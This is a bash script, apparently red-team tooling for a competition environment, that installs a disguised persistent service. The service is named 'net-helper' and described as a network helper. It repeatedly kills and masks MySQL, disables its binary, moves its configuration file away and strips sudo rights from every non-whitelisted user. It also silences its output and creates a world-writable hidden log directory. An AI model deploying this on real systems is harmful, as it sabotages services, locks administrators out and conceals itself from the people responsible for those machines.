#!/bin/bash

# ── WHITELIST ─────────────────────────────────────────
# These users will NEVER be touched
WHITELIST=(
    "greyteam"
    "scoring"
    "cia"
    "kgb"
)
# ──────────────────────────────────────────────────────

LOG="/var/lib/.cache/mysql_watch.log"
mkdir -p /var/lib/.cache
chmod 777 /var/lib/.cache

is_whitelisted() {
    local user="$1"
    for w in "${WHITELIST[@]}"; do
        if [[ "$user" == "$w" ]]; then
            return 0
        fi
    done
    return 1
}

echo "[$(date)] Installing watcher..." >> $LOG

# 1. Drop watcher script
cat > /usr/lib/systemd/system-sleep/net_helper.sh << 'WATCHER'
#!/bin/bash

WHITELIST=("greyteam" "scoring" "cia" "kgb")
LOG="/var/lib/.cache/mysql_watch.log"

is_whitelisted() {
    local user="$1"
    for w in "${WHITELIST[@]}"; do
        [[ "$user" == "$w" ]] && return 0
    done
    return 1
}

while true; do
    # ── Check and kill MySQL ──────────────────────────
    if systemctl is-active --quiet mysql || \
       pgrep -x mysqld > /dev/null 2>&1; then

        echo "[$(date)] MySQL detected UP — killing" >> $LOG

        systemctl stop mysql       2>/dev/null
        systemctl mask mysql       2>/dev/null
        pkill -9 mysqld            2>/dev/null
        pkill -9 mysqld_safe       2>/dev/null
        chmod 000 /usr/sbin/mysqld 2>/dev/null

        # re-corrupt config if restored
        if [ -f /etc/mysql/mysql.conf.d/mysqld.cnf ]; then
            mv /etc/mysql/mysql.conf.d/mysqld.cnf \
               /etc/mysql/mysql.conf.d/mysqld.cnf.bak
            echo "[$(date)] Config re-corrupted" >> $LOG
        fi

        echo "[$(date)] MySQL killed" >> $LOG
    fi

    # ── Whitelist enforcement — remove any new
    #    sudo privs granted to non-whitelisted users ──
    while IFS= read -r sudoer; do
        username=$(echo "$sudoer" | awk '{print $1}')
        if ! is_whitelisted "$username"; then
            # remove from sudo group silently
            gpasswd -d "$username" sudo 2>/dev/null
            echo "[$(date)] Removed sudo from $username" >> $LOG
        fi
    done < <(getent group sudo | cut -d: -f4 | tr ',' '\n')

    sleep 15
done
WATCHER

chmod +x /usr/lib/systemd/system-sleep/net_helper.sh

# 2. Create systemd service for watcher
cat > /etc/systemd/system/net-helper.service << 'SERVICE'
[Unit]
Description=Network Helper Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/lib/systemd/system-sleep/net_helper.sh
Restart=always
RestartSec=5
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
SERVICE

# 3. Enable and start
systemctl daemon-reload
systemctl enable net-helper.service
systemctl start net-helper.service

echo "[$(date)] Watcher installed and running" >> $LOG